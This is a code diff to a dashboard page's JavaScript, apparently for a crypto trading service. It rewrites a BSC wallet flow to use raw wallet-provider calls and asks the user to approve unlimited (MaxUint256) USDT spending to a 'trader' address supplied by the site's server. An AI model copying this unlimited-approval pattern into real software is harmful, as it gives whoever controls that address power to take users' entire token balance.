@@ -1067,12 +1067,10 @@ document.getElementById('binanceGuide').addEventListener('click',function(e){if(
   };
 })();
 
-// ═══ 仪表盘内钱包授权 ═══
-var wfEthers = null;
-var wfProvider = null;
-var wfSigner = null;
+// ═══ 仪表盘内钱包授权（纯原生 window.ethereum，不依赖 ethers.js）═══
 var wfUsdtAddr = '0x55d398326f99059fF775485246999027B3197955';
 var wfTraderAddr = '';
+var wfWalletAddr = '';
 
 function wfShowStep(n) {
   for (var i = 1; i <= 3; i++) {
@@ -1092,13 +1090,6 @@ async function wfConnectWallet() {
   if (!btn) return;
   btn.disabled = true; btn.textContent = '连接中...';
 
-  if (typeof ethers === 'undefined') {
-    wfShowMsg('ethers.js 加载失败，请刷新页面重试', '#f85149');
-    btn.disabled = false; btn.textContent = '连接 BSC 钱包';
-    return;
-  }
-  wfEthers = ethers;
-
   if (!window.ethereum) {
     wfShowMsg('未检测到钱包<br>请在 TokenPocket / MetaMask 内打开本页面', '#f85149');
     btn.disabled = false; btn.textContent = '连接 BSC 钱包';
@@ -1106,21 +1097,26 @@ async function wfConnectWallet() {
   }
 
   try {
-    wfProvider = new ethers.BrowserProvider(window.ethereum);
-    await wfProvider.send('eth_requestAccounts', []);
-    wfSigner = await wfProvider.getSigner();
-    var addr = await wfSigner.getAddress();
-    var balance = await wfProvider.getBalance(addr);
-    var bnb = parseFloat(ethers.formatEther(balance));
+    var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    var addr = accounts[0];
+    if (!addr) { throw new Error('未获取到钱包地址'); }
+    wfWalletAddr = addr;
 
-    // 检查 BSC
-    var network = await wfProvider.getNetwork();
-    if (Number(network.chainId) !== 56) {
-      try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); }
-      catch(e) { wfShowMsg('请切换到 BSC 网络', '#f85149'); btn.disabled = false; btn.textContent = '连接 BSC 钱包'; return; }
+    var balHex = await window.ethereum.request({ method: 'eth_getBalance', params: [addr, 'latest'] });
+    var bnb = parseInt(balHex, 16) / 1e18;
+
+    var chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+    var chainId = parseInt(chainIdHex, 16);
+    if (chainId !== 56) {
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+      } catch(e) {
+        wfShowMsg('请先切换到 BSC 网络', '#f85149');
+        btn.disabled = false; btn.textContent = '连接 BSC 钱包';
+        return;
+      }
     }
 
-    // 获取 trader 地址
     var tk = getToken();
     var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
     var data = await resp.json();
@@ -1132,15 +1128,14 @@ async function wfConnectWallet() {
     document.getElementById('wfWalletAddr').textContent = addr.substring(0, 8) + '...' + addr.substring(36);
     document.getElementById('wfBnbBal').textContent = bnb.toFixed(4) + ' BNB';
 
-    // 自动绑定钱包地址到后端
     try {
-      var tk = getToken();
+      var tk2 = getToken();
       await fetch('/api/vault/bsc-wallet', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk },
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk2 },
         body: JSON.stringify({ bscWalletAddr: addr })
       });
-    } catch(e) { /* 绑定失败不阻塞授权 */ }
+    } catch(e) {}
 
     wfShowStep(2);
 
@@ -1162,45 +1157,82 @@ async function wfDoApprove() {
   btn.disabled = true; btn.textContent = '授权中...';
   wfShowStep(3);
   var msgEl = document.getElementById('wfStatusMsg');
-  msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
-  msgEl.style.color = '#58a6ff';
+  if (msgEl) {
+    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
+    msgEl.style.color = '#58a6ff';
+  }
 
   try {
-    // 检查 trader 地址
+    // 获取钱包地址
+    var accounts = await window.ethereum.request({ method: 'eth_accounts' });
+    var addr = accounts[0];
+    if (!addr) { throw new Error('请先连接钱包'); }
+    wfWalletAddr = addr;
+
+    // 获取 trader 地址
     if (!wfTraderAddr) {
-      // 重新获取 trader 地址
       var tk = getToken();
       var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
       var data = await resp.json();
-      if (data.success) { wfTraderAddr = data.traderAddress; wfUsdtAddr = data.usdtAddress; }
+      if (data.success) {
+        wfTraderAddr = data.traderAddress;
+        wfUsdtAddr = data.usdtAddress;
+      }
     }
-    if (!wfTraderAddr) { wfShowMsg('获取授权地址失败，请刷新重试', '#f85149'); btn.disabled = false; btn.textContent = '授权 USDT'; wfShowStep(2); return; }
+    if (!wfTraderAddr) { throw new Error('获取授权地址失败，请刷新重试'); }
 
-    // 获取当前钱包地址
-    var addr = await wfSigner.getAddress();
+    // 先检查链上是否已经授权了
+    var allowData = '0xdd62ed3e'
+      + addr.toLowerCase().replace('0x','').padStart(64,'0')
+      + wfTraderAddr.toLowerCase().replace('0x','').padStart(64,'0');
+    var allowResult = await window.ethereum.request({
+      method: 'eth_call',
+      params: [{ to: wfUsdtAddr, data: allowData }, 'latest']
+    });
+    var currentAllow = BigInt(allowResult);
 
-    // 用原生 eth_sendTransaction 发送 approve 交易
-    // approve(address spender, uint256 amount) = 0x095ea7b3
-    // spender = wfTraderAddr (32 bytes padded)
-    // amount = MaxUint256 (32 bytes)
+    if (currentAllow > BigInt(1000) * BigInt('1000000000000000000')) {
+      // 已经授权过了
+      if (msgEl) { msgEl.innerHTML = '链上已授权，正在同步状态...'; msgEl.style.color = '#58a6ff'; }
+      var tk2 = getToken();
+      var resp3 = await fetch('/api/vault/approve-confirmed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk2 },
+        body: JSON.stringify({ txHash: 'already-approved' })
+      });
+      var d3 = await resp3.json();
+      if (d3.success) {
+        if (msgEl) { msgEl.innerHTML = '✅ 已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
+      } else {
+        if (msgEl) { msgEl.innerHTML = '✅ 链上已授权，请稍后刷新'; msgEl.style.color = '#3fb950'; }
+      }
+      setTimeout(function() { refreshAll(); }, 1500);
+      return;
+    }
+
+    // 构造 approve calldata: approve(spender, MaxUint256)
     var spenderPadded = wfTraderAddr.toLowerCase().replace('0x','').padStart(64,'0');
     var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     var approveData = '0x095ea7b3' + spenderPadded + maxUint;
 
-    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
+    if (msgEl) {
+      msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
+    }
 
+    // 发送 approve 交易 — 纯原生 eth_sendTransaction
     var txHash = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
         from: addr,
         to: wfUsdtAddr,
         data: approveData
-        // 不传 gas/gasPrice — 让钱包自动估算
       }]
     });
 
-    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>交易已发送: ' + txHash.substring(0,18) + '...<br>等待链上确认...';
-    msgEl.style.color = '#58a6ff';
+    if (msgEl) {
+      msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>交易已发送: ' + txHash.substring(0,18) + '...<br>等待链上确认...';
+      msgEl.style.color = '#58a6ff';
+    }
 
     // 轮询交易收据
     var receipt = null;
@@ -1213,58 +1245,53 @@ async function wfDoApprove() {
     }
 
     if (!receipt) {
-      msgEl.innerHTML = '⏳ 交易已发送，确认中...<br>Hash: ' + txHash.substring(0,18) + '...<br>请稍后在仪表盘查看状态';
-      msgEl.style.color = '#d29922';
-      // 仍然通知后端
-      var tk2 = getToken();
+      if (msgEl) {
+        msgEl.innerHTML = '⏳ 交易已发送，确认中...<br>Hash: ' + txHash.substring(0,18) + '...';
+        msgEl.style.color = '#d29922';
+      }
+      var tk3 = getToken();
       fetch('/api/vault/approve-confirmed', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk2 },
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk3 },
         body: JSON.stringify({ txHash: txHash })
       }).then(function() { setTimeout(function(){ refreshAll(); }, 2000); }).catch(function(){});
       return;
     }
 
     if (receipt.status === '0x1' || receipt.status === 1) {
-      msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#3fb950;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>授权成功！正在通知系统...';
-      msgEl.style.color = '#3fb950';
+      if (msgEl) {
+        msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#3fb950;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>授权成功！正在通知系统...';
+        msgEl.style.color = '#3fb950';
+      }
 
-      // 通知后端
-      var tk3 = getToken();
+      var tk4 = getToken();
       var resp2 = await fetch('/api/vault/approve-confirmed', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk3 },
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk4 },
         body: JSON.stringify({ txHash: txHash })
       });
       var data2 = await resp2.json();
 
       if (data2.success) {
-        msgEl.innerHTML = '✅ 授权成功！盖茨费系统已激活';
-        msgEl.style.color = '#3fb950';
-        setTimeout(function() { refreshAll(); }, 2000);
+        if (msgEl) { msgEl.innerHTML = '✅ 授权成功！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
       } else {
-        msgEl.innerHTML = '✅ 链上授权成功，系统确认稍后自动完成';
-        msgEl.style.color = '#3fb950';
-        setTimeout(function() { refreshAll(); }, 3000);
+        if (msgEl) { msgEl.innerHTML = '✅ 链上授权成功，系统确认稍后自动完成'; msgEl.style.color = '#3fb950'; }
       }
+      setTimeout(function() { refreshAll(); }, 2000);
     } else {
-      msgEl.textContent = '交易执行失败，请重试';
-      msgEl.style.color = '#f85149';
+      if (msgEl) { msgEl.textContent = '交易执行失败，请重试'; msgEl.style.color = '#f85149'; }
       btn.disabled = false; btn.textContent = '授权 USDT';
       wfShowStep(2);
     }
   } catch(e) {
     var msg = e.message || '未知错误';
     if (e.code === 4001 || e.code === 'ACTION_REJECTED') msg = '用户取消了交易';
-    else if (msg.includes('insufficient funds')) msg = 'BNB 余额不足以支付 gas 费';
-    msgEl.textContent = '授权失败: ' + msg;
-    msgEl.style.color = '#f85149';
+    else if (msg.indexOf('insufficient funds') !== -1) msg = 'BNB 余额不足以支付 gas 费';
+    if (msgEl) { msgEl.textContent = '授权失败: ' + msg; msgEl.style.color = '#f85149'; }
     btn.disabled = false; btn.textContent = '授权 USDT';
     wfShowStep(2);
   }
 }
 </script>
-<!-- ethers.js for in-dashboard wallet approval -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
 </body>
 </html>
